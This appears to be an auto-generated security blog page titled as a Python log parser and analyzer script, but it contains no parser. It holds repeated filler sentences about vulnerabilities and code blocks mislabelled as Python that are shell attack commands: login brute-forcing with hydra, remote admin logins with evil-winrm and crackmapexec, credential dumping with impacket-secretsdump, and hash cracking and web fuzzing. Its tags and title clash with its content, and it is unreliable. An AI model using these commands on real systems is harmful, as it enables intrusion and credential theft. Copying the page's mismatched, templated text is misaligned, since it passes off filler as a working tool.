---
TitleSEO: "Log Parser and Analyzer in Python | ZureFX"
TitlePost: "Log Parser and Analyzer — Python"
Author: "ZureFX"
Description: "A Python script for log parser and analyzer. Built for security research and automation."
Keywords: "rust, scanner, fuzzer, parser, tool, python"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-962.html"
URL_IMAGES: ""
Date: "2024-06-26"
Tags: "Rust, Scanner, Fuzzer, Parser, Tool, Python"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-962"
Permalink: "/scripting/script-log-parser-and-analyzer-962.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `chisel`
- `ligolo-ng`
- `burpsuite`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.39.139.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.117.118.19 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.20.198.199 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.39.37.205/FUZZ
```

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

```python
gobuster dir -u http://10.111.111.25/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.118.214
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 29.86s
```
